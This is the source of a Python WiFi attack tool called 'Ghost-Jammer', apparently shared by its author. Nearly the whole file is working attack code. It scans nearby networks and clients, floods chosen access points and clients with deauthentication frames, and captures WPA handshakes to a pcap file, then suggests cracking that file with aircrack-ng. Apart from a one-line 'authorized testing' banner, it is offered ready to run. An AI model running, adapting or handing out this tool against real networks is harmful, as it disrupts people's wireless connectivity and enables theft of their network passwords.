#!/usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0
import os
import sys
import time
import re
import threading
from threading import Thread, Lock
from subprocess import Popen, PIPE
from signal import SIGINT, signal
import argparse
import socket
import struct
import fcntl
import json
from collections import defaultdict
from scapy.sendrecv import sniff
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11Deauth, RadioTap

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[1;31m' # red
G  = '\033[1;32m' # green
O  = '\033[1;33m' # orange
B  = '\033[1;34m' # blue
P  = '\033[1;35m' # purple
C  = '\033[1;36m' # cyan
GR = '\033[1;37m' # gray
T  = '\033[1;93m' # tan

# Global variables
APs = []
DN = None
lock = Lock()
monitor_on = None
mon_iface = ""
mon_MAC = ""
stop_attack = False
stop_scan = False
current_channel = "1"
selected_targets = []
handshake_capture = False
capture_file = "ghost_jammer_capture.pcap"
args = None
scan_timeout = 20  # Default scan duration
handshake_timeout = 120  # Default handshake capture duration
handshake_captured = False

# Ghost-Jammer Banner
def banner():
    os.system('clear')
    print(f"""{P}                                                                                                                
 @@@@@@@  @@@  @@@  @@@@@@   @@@@@@ @@@@@@@              @@@  @@@@@@  @@@@@@@@@@  @@@@@@@@@@  @@@@@@@@ @@@@@@@  
!@@       @@!  @@@ @@!  @@@ !@@       @!!                @@! @@!  @@@ @@! @@! @@! @@! @@! @@! @@!      @@!  @@@ 
!@! @!@!@ @!@!@!@! @!@  !@!  !@@!!    @!!   @!@!@!@!     !!@ @!@!@!@! @!! !!@ @!@ @!! !!@ @!@ @!!!:!   @!@!!@!  
:!!   !!: !!:  !!! !!:  !!!     !:!   !!:            .  .!!  !!:  !!! !!:     !!: !!:     !!: !!:      !!: :!!  
 :: :: :   :   : :  : :. :  ::.: :     :             ::.::    :   : :  :      :    :      :   : :: ::   :   : : 
                                                                                                                {C}
>>> Professional WiFi Security Toolkit <<<{W}
{G}Telegram: {T}@sigma_cyber_ghost {C}| {G}Instagram: {T}@safderkhan0800_ {C}| {G}GitHub: {T}@sigma-cyber-ghost{W}
{R}Use only for authorized security testing!{W}
""")

# Main Menu
def main_menu():
    banner()
    print(f"{O}Main Menu:{W}")
    print(f"  {C}1.{W} Scan Networks")
    print(f"  {C}2.{W} Select Targets")
    print(f"  {C}3.{W} Start Attack")
    print(f"  {C}4.{W} Capture Handshakes")
    print(f"  {C}5.{W} View Scan Results")
    print(f"  {C}6.{W} Configure Settings")
    print(f"  {C}7.{W} Save Scan Results")
    print(f"  {C}8.{W} Exit")
    choice = input(f"\n[{G}?{W}] Select an option: ")
    return choice

# Settings Menu
def settings_menu():
    global args, scan_timeout, handshake_timeout
    banner()
    print(f"{O}Configuration Settings:{W}")
    print(f"  {C}1.{W} Interface: {G}{args.interface if args.interface else 'auto'}{W}")
    print(f"  {C}2.{W} Channel: {G}{args.channel if args.channel else 'all'}{W}")
    print(f"  {C}3.{W} Skip MAC: {G}{args.skip if args.skip else 'none'}{W}")
    print(f"  {C}4.{W} Max Clients: {G}{args.maximum if args.maximum else 'unlimited'}{W}")
    print(f"  {C}5.{W} Time Interval: {G}{args.timeinterval if args.timeinterval else 'fastest'}{W}")
    print(f"  {C}6.{W} Packets: {G}{args.packets if args.packets else '1'}{W}")
    print(f"  {C}7.{W} Directed Only: {G}{'yes' if args.directedonly else 'no'}{W}")
    print(f"  {C}8.{W} Target AP: {G}{args.accesspoint if args.accesspoint else 'all'}{W}")
    print(f"  {C}9.{W} World Channels: {G}{'yes' if args.world else 'no'}{W}")
    print(f"  {C}10.{W} Scan Duration: {G}{scan_timeout}{W} seconds")
    print(f"  {C}11.{W} Handshake Timeout: {G}{handshake_timeout}{W} seconds")
    print(f"  {C}0.{W} Back to Main Menu")
    
    choice = input(f"\n[{G}?{W}] Select setting to change: ")
    return choice

# Parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address")
    parser.add_argument("-i", "--interface", help="Monitor mode interface")
    parser.add_argument("-c", "--channel", help="Listen on specific channel")
    parser.add_argument("-m", "--maximum", help="Max number of clients to deauth")
    parser.add_argument("-n", "--noupdate", action='store_true', help="Don't clear deauth list when max reached")
    parser.add_argument("-t", "--timeinterval", help="Time interval between packets")
    parser.add_argument("-p", "--packets", help="Number of packets per burst")
    parser.add_argument("-d", "--directedonly", action='store_true', help="Only send to client/AP pairs")
    parser.add_argument("-a", "--accesspoint", help="Target specific AP MAC address")
    parser.add_argument("--world", action="store_true", help="Enable 13 channels mode")
    return parser.parse_args()

########################################
# Interface Functions
########################################
def get_mon_iface():
    global monitor_on
    monitors, interfaces = iwconfig()
    if args.interface:
        monitor_on = True
        return args.interface
    if monitors:
        monitor_on = True
        return monitors[0]
    else:
        print(f'[{G}*{W}] Finding most powerful interface...')
        interface = get_iface(interfaces)
        monmode = start_mon_mode(interface)
        return monmode

def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    except OSError:
        sys.exit(f'[{R}-{W}] Could not execute "iwconfig"')
    for line in proc.communicate()[0].decode().split('\n'):
        if not line: continue
        if line[0] != ' ':
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search:
                iface = line.split(' ')[0]
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    interfaces[iface] = 1 if "ESSID:\"" in line else 0
    return monitors, interfaces

def get_iface(interfaces):
    scanned_aps = []
    if not interfaces:
        sys.exit(f'[{R}-{W}] No wireless interfaces found')
    if len(interfaces) == 1:
        return list(interfaces.keys())[0]

    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].decode().split('\n'):
            if ' - Address:' in line:
                count += 1
        scanned_aps.append((count, iface))
        print(f'[{G}+{W}] Networks discovered by {G}{iface}{W}: {T}{count}{W}')
    
    try:
        return max(scanned_aps)[1]
    except Exception as e:
        print(f'[{R}-{W}] Minor error: {e}')
        return list(interfaces.keys())[0]

def start_mon_mode(interface):
    print(f'[{G}+{W}] Starting monitor mode on {G}{interface}{W}')
    try:
        os.system(f'ifconfig {interface} down >/dev/null 2>&1')
        os.system(f'iwconfig {interface} mode monitor >/dev/null 2>&1')
        os.system(f'ifconfig {interface} up >/dev/null 2>&1')
        return interface
    except Exception:
        sys.exit(f'[{R}-{W}] Could not start monitor mode')

def remove_mon_iface():
    global mon_iface
    if mon_iface:
        os.system(f'ifconfig {mon_iface} down >/dev/null 2>&1')
        os.system(f'iwconfig {mon_iface} mode managed >/dev/null 2>&1')
        os.system(f'ifconfig {mon_iface} up >/dev/null 2>&1')

def mon_mac():
    global mon_iface, mon_MAC
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15].encode()))
    mon_MAC = ':'.join(f'{b:02x}' for b in info[18:24])
    print(f'[{G}*{W}] Monitor: {G}{mon_iface}{W} - {O}{mon_MAC}{W}')
    return mon_MAC

########################################
# Scanning Functions
########################################
def channel_hopper():
    global current_channel, stop_scan
    channels = list(range(1, 14)) if args.world else list(range(1, 12))
    channel_index = 0
    
    while not stop_scan:
        current_channel = str(channels[channel_index])
        try:
            Popen(['iw', 'dev', mon_iface, 'set', 'channel', current_channel], stdout=DN, stderr=DN)
        except:
            pass
        time.sleep(0.5)
        channel_index = (channel_index + 1) % len(channels)

def packet_handler(pkt):
    global APs
    if stop_scan:
        return
        
    if pkt.haslayer(Dot11Beacon):
        try:
            # Extract MAC address of the network
            bssid = pkt[Dot11].addr3.lower()
            
            # Get the name of it
            ssid = pkt[Dot11Elt].info.decode()
            if ssid == "" or ssid == "\x00":
                ssid = "<hidden>"
                
            # Extract network stats
            try:
                channel = str(ord(pkt[Dot11Elt:3].info))
            except:
                channel = "?"
                
            dbm_signal = pkt.dBm_AntSignal
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel", "?")
            
            # Check if we already have this network
            found = False
            for ap in APs:
                if ap['bssid'] == bssid:
                    found = True
                    # Update channel if we have a better value
                    if channel != "?" and ap['channel'] == "?":
                        ap['channel'] = channel
                    break
                    
            if not found:
                with lock:
                    APs.append({
                        'bssid': bssid,
                        'ssid': ssid,
                        'channel': str(channel),
                        'clients': [],
                        'signal': dbm_signal
                    })
                    
        except Exception as e:
            pass
            
    elif pkt.haslayer(Dot11):
        # Client probe request
        if pkt.type == 0 and pkt.subtype == 4:
            try:
                client = pkt.addr2.lower()
                # Look for the AP this client is probing for
                for ap in APs:
                    if ap['bssid'] in pkt.addr3.lower():
                        if client not in ap['clients'] and client != ap['bssid']:
                            with lock:
                                ap['clients'].append(client)
            except:
                pass
        
        # Data packet (client to AP)
        elif pkt.type == 2:
            try:
                client = pkt.addr1.lower() if pkt.addr1 != 'ff:ff:ff:ff:ff:ff' else None
                ap_bssid = pkt.addr2.lower()
                
                if client and client != mon_MAC:
                    for ap in APs:
                        if ap['bssid'] == ap_bssid:
                            if client not in ap['clients']:
                                with lock:
                                    ap['clients'].append(client)
                            break
            except:
                pass

def display_networks():
    global APs
    banner()
    print(f"{O}Discovered Networks:{W}\n")
    
    if not APs:
        print(f"[{R}!{W}] No networks found during scan!")
        return
    
    print(f"{C}ID  {'BSSID':17}  CH  {'ESSID':20}  Clients  Signal{W}")
    print(f"{C}{'-'*60}{W}")
    
    # Sort by signal strength (strongest first)
    APs.sort(key=lambda x: x.get('signal', -100), reverse=True)
    
    for i, ap in enumerate(APs):
        clients = len(ap['clients'])
        ssid = ap['ssid'] if ap['ssid'] != "<hidden>" else f"{GR}<hidden>{W}"
        signal = ap.get('signal', '?')
        signal_str = f"{T}{signal}{W} dBm" if signal != '?' else f"{GR}?{W}"
        
        print(f"{T}{i+1:<3}{W} {O}{ap['bssid']}{W}  {G}{ap['channel']:>2}{W}  {T}{ssid[:20]:20}{W}  {P}{clients:>4}{W}    {signal_str}")
    
    print(f"\n[{G}+{W}] Found {T}{len(APs)}{W} access points")
    print(f"[{G}*{W}] Press {R}Ctrl+C{W} to stop scanning")
    print(f"[{G}?{W}] Enter target IDs separated by commas (e.g. 1,3,5) or 0 to return")

def scan_networks():
    global APs, mon_iface, mon_MAC, stop_scan, scan_timeout
    
    banner()
    print(f"[{G}*{W}] Preparing to scan networks...")
    
    APs = []
    stop_scan = False
    
    # Setup monitor interface
    try:
        mon_iface = get_mon_iface()
        conf.iface = mon_iface
        mon_MAC = mon_mac()
    except Exception as e:
        print(f"[{R}!{W}] Error: {e}")
        time.sleep(2)
        return
        
    print(f"[{G}+{W}] Starting network scan on {G}{mon_iface}{W}...")
    print(f"[{G}*{W}] Scanning all channels (Press Ctrl+C to stop)\n")
    
    # Start channel hopper
    hopper = Thread(target=channel_hopper)
    hopper.daemon = True
    hopper.start()
    
    # Start sniffer
    try:
        print(f"[{G}*{W}] Scanning for {T}{scan_timeout}{W} seconds...")
        sniff(iface=mon_iface, prn=packet_handler, store=0, timeout=scan_timeout)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[{R}!{W}] Scan error: {e}")
    
    stop_scan = True
    time.sleep(0.5)
    
    if not APs:
        print(f"[{R}!{W}] No networks found!")
        input("Press Enter to continue...")
        return
    
    display_networks()
    
    # Target selection
    targets = input("\nSelect targets: ")
    if targets.strip() == "0":
        return
    
    global selected_targets
    selected_targets = []
    for tid in targets.split(','):
        try:
            idx = int(tid.strip()) - 1
            if 0 <= idx < len(APs):
                selected_targets.append(APs[idx])
        except:
            pass
    
    if selected_targets:
        print(f"\n[{G}+{W}] Selected targets:")
        for t in selected_targets:
            print(f"  - {O}{t['bssid']}{W} ({T}{t['ssid']}{W})")
        input("\nPress Enter to continue...")

########################################
# Attack Functions
########################################
def channel_hop_attack():
    global current_channel, stop_attack
    channels = set()
    
    # Get channels from selected targets
    for target in selected_targets:
        channels.add(target['channel'])
    
    if not channels:
        channels = list(range(1, 14)) if args.world else list(range(1, 12))
    else:
        channels = sorted([int(c) for c in channels])
    
    channel_index = 0
    
    while not stop_attack:
        current_channel = str(channels[channel_index])
        try:
            Popen(['iw', 'dev', mon_iface, 'set', 'channel', current_channel], stdout=DN, stderr=DN)
        except:
            pass
        
        deauth_attack()
        time.sleep(0.5)
        channel_index = (channel_index + 1) % len(channels)

def deauth_attack():
    global selected_targets
    if not selected_targets or stop_attack:
        return
    
    for target in selected_targets:
        # Deauth clients
        for client in target['clients']:
            try:
                pkt1 = RadioTap()/Dot11(addr1=client, addr2=target['bssid'], addr3=target['bssid'])/Dot11Deauth()
                pkt2 = RadioTap()/Dot11(addr1=target['bssid'], addr2=client, addr3=client)/Dot11Deauth()
                sendp(pkt1, iface=mon_iface, count=1, verbose=0)
                sendp(pkt2, iface=mon_iface, count=1, verbose=0)
            except:
                pass
        
        # Deauth broadcast
        if not args.directedonly:
            try:
                pkt = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=target['bssid'], addr3=target['bssid'])/Dot11Deauth()
                sendp(pkt, iface=mon_iface, count=1, verbose=0)
            except:
                pass

def capture_handshake(pkt):
    global handshake_capture, handshake_captured
    if not handshake_capture:
        return
    
    # Capture EAPOL handshake packets
    if pkt.haslayer(EAPOL):
        wrpcap(capture_file, pkt, append=True)
        handshake_captured = True
    # Capture beacon frames for SSID info
    elif pkt.haslayer(Dot11Beacon) and any(t['bssid'] == pkt.addr3.lower() for t in selected_targets):
        wrpcap(capture_file, pkt, append=True)

def attack_status():
    global stop_attack
    start_time = time.time()
    
    while not stop_attack:
        elapsed = int(time.time() - start_time)
        banner()
        print(f"{O}Active Attack:{W}\n")
        
        print(f"{C}{'Target':20} {'Clients':>6} {'Packets':>8} {'Status':>10}{W}")
        print(f"{C}{'-'*50}{W}")
        
        for i, target in enumerate(selected_targets):
            status = f"{G}ACTIVE{W}" if i < 3 else f"{T}QUEUED{W}"  # Simplified status
            print(f"{T}{target['ssid'][:18]:20}{W} {P}{len(target['clients']):>6}{W} {R}{i*15:>8}{W} {status:>10}")
        
        print(f"\n[{G}+{W}] Elapsed: {T}{elapsed}{W} seconds | Channel: {G}{current_channel}{W}")
        print(f"[{G}*{W}] Press {R}Ctrl+C{W} to stop attack")
        
        if handshake_capture:
            if handshake_captured:
                print(f"[{G}++{W}] {G}HANDSHAKE CAPTURED!{W} File: {T}{capture_file}{W}")
            else:
                print(f"[{C}**{W}] {C}Capturing handshakes...{W} Timeout: {T}{handshake_timeout - elapsed}{W}s")
        
        print(f"[{R}!!{W}] {R}ATTACK IN PROGRESS{W}")
        time.sleep(1)

def start_attack():
    global stop_attack, handshake_capture, handshake_captured
    
    if not selected_targets:
        print(f"[{R}!{W}] No targets selected! Scan networks first.")
        time.sleep(2)
        return
    
    banner()
    print(f"[{G}*{W}] Starting attack on {T}{len(selected_targets)}{W} targets...")
    
    # Setup monitor interface
    try:
        mon_iface = get_mon_iface()
        conf.iface = mon_iface
        mon_MAC = mon_mac()
    except Exception as e:
        print(f"[{R}!{W}] Error: {e}")
        return
    
    stop_attack = False
    handshake_captured = False
    
    # Start attack threads
    attack_thread = Thread(target=channel_hop_attack)
    attack_thread.daemon = True
    attack_thread.start()
    
    status_thread = Thread(target=attack_status)
    status_thread.daemon = True
    status_thread.start()
    
    # Start handshake capture if requested
    if handshake_capture:
        print(f"[{G}+{W}] Capturing handshakes to {capture_file} (timeout: {handshake_timeout}s)")
        try:
            sniff(iface=mon_iface, prn=capture_handshake, store=0, timeout=handshake_timeout)
        except Exception as e:
            print(f"[{R}!{W}] Capture error: {e}")
    
    # Stop attack after timeout or if handshake captured
    stop_attack = True
    time.sleep(1)  # Let threads finish
    
    remove_mon_iface()
    
    if handshake_capture:
        if handshake_captured:
            print(f"\n[{G}++{W}] {G}HANDSHAKE SUCCESSFULLY CAPTURED!{W}")
            print(f"[{G}*{W}] Saved to: {T}{capture_file}{W}")
            print(f"[{G}*{W}] You can now use tools like aircrack-ng to crack the file")
        else:
            print(f"\n[{R}!!{W}] {R}No handshake captured during timeout period{R}")
        input("\nPress Enter to return to menu...")
    else:
        print(f"\n[{G}*{W}] Attack stopped")
        time.sleep(2)

def capture_handshakes():
    global handshake_capture, handshake_captured
    banner()
    print(f"{O}Capture WiFi Handshakes:{W}\n")
    
    if not selected_targets:
        print(f"[{R}!{W}] No targets selected! Scan networks first.")
        time.sleep(2)
        return
    
    print(f"[{G}*{W}] This will capture authentication handshakes for selected targets")
    print(f"[{G}*{W}] Handshakes will be saved to: {T}{capture_file}{W}")
    print(f"[{G}*{W}] Timeout: {T}{handshake_timeout}{W} seconds")
    confirm = input(f"\n[{G}?{W}] Start capture? (y/N): ")
    
    if confirm.lower() == 'y':
        handshake_capture = True
        handshake_captured = False
        start_attack()
        handshake_capture = False
    else:
        print(f"[{G}*{W}] Capture canceled")
        time.sleep(1)

def save_scan_results():
    banner()
    if not APs:
        print(f"[{R}!{W}] No scan results to save!")
        time.sleep(1)
        return
    
    filename = input(f"[{G}?{W}] Enter filename to save (default: scan_results.json): ")
    if not filename:
        filename = "scan_results.json"
    
    try:
        with open(filename, 'w') as f:
            json.dump(APs, f, indent=2)
        print(f"[{G}+{W}] Results saved to {T}{filename}{W}")
    except Exception as e:
        print(f"[{R}!{W}] Error saving file: {e}")
    
    time.sleep(1)

def load_scan_results():
    global APs, selected_targets
    banner()
    filename = input(f"[{G}?{W}] Enter filename to load (default: scan_results.json): ")
    if not filename:
        filename = "scan_results.json"
    
    try:
        with open(filename, 'r') as f:
            APs = json.load(f)
        print(f"[{G}+{W}] Loaded {T}{len(APs)}{W} access points from {filename}")
        selected_targets = []
        input("Press Enter to continue...")
        return True
    except Exception as e:
        print(f"[{R}!{W}] Error loading file: {e}")
        time.sleep(2)
        return False

if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit(f'[{R}-{W}] Please run as root')
    
    DN = open(os.devnull, 'w')
    args = parse_args()
    
    try:
        while True:
            choice = main_menu()
            
            if choice == '1':  # Scan Networks
                scan_networks()
            elif choice == '2':  # Select Targets
                if not APs:
                    print(f"[{R}!{W}] No scan results! Please scan first.")
                    time.sleep(1)
                else:
                    display_networks()
                    targets = input("\nSelect targets (comma separated): ")
                    selected_targets = []
                    for tid in targets.split(','):
                        try:
                            idx = int(tid.strip()) - 1
                            if 0 <= idx < len(APs):
                                selected_targets.append(APs[idx])
                        except:
                            pass
                    if selected_targets:
                        print(f"[{G}+{W}] Selected {len(selected_targets)} targets")
                    time.sleep(1)
            elif choice == '3':  # Start Attack
                handshake_capture = False
                start_attack()
            elif choice == '4':  # Capture Handshakes
                capture_handshakes()
            elif choice == '5':  # View Scan Results
                if APs:
                    display_networks()
                    input("\nPress Enter to continue...")
                else:
                    print(f"[{R}!{W}] No scan results! Please scan first.")
                    time.sleep(1)
            elif choice == '6':  # Configure Settings
                while True:
                    setting_choice = settings_menu()
                    if setting_choice == '0':
                        break
                    elif setting_choice == '1':
                        args.interface = input(f"\n[{G}?{W}] Enter interface (leave blank for auto): ")
                    elif setting_choice == '2':
                        args.channel = input(f"\n[{G}?{W}] Enter channel (1-13, blank for all): ")
                    elif setting_choice == '3':
                        args.skip = input(f"\n[{G}?{W}] Enter MAC to skip (format: AA:BB:CC:DD:EE:FF): ")
                    elif setting_choice == '4':
                        args.maximum = input(f"\n[{G}?{W}] Enter max clients: ")
                    elif setting_choice == '5':
                        args.timeinterval = input(f"\n[{G}?{W}] Enter time interval (seconds): ")
                    elif setting_choice == '6':
                        args.packets = input(f"\n[{G}?{W}] Enter packets per burst: ")
                    elif setting_choice == '7':
                        args.directedonly = not args.directedonly
                    elif setting_choice == '8':
                        args.accesspoint = input(f"\n[{G}?{W}] Enter target AP MAC: ")
                    elif setting_choice == '9':
                        args.world = not args.world
                    elif setting_choice == '10':
                        try:
                            new_timeout = int(input(f"\n[{G}?{W}] Enter scan duration (seconds): "))
                            scan_timeout = new_timeout
                        except:
                            print(f"[{R}!{W}] Invalid input")
                    elif setting_choice == '11':
                        try:
                            new_timeout = int(input(f"\n[{G}?{W}] Enter handshake capture timeout (seconds): "))
                            handshake_timeout = new_timeout
                        except:
                            print(f"[{R}!{W}] Invalid input")
            elif choice == '7':  # Save Scan Results
                save_scan_results()
            elif choice == '8':  # Exit
                print(f"\n[{G}*{W}] Exiting Ghost-Jammer...")
                remove_mon_iface()
                DN.close()
                sys.exit(0)
            else:
                print(f"\n[{R}!{W}] Invalid choice!")
                time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n[{G}*{W}] Exiting Ghost-Jammer...")
        remove_mon_iface()
        DN.close()
        sys.exit(0)
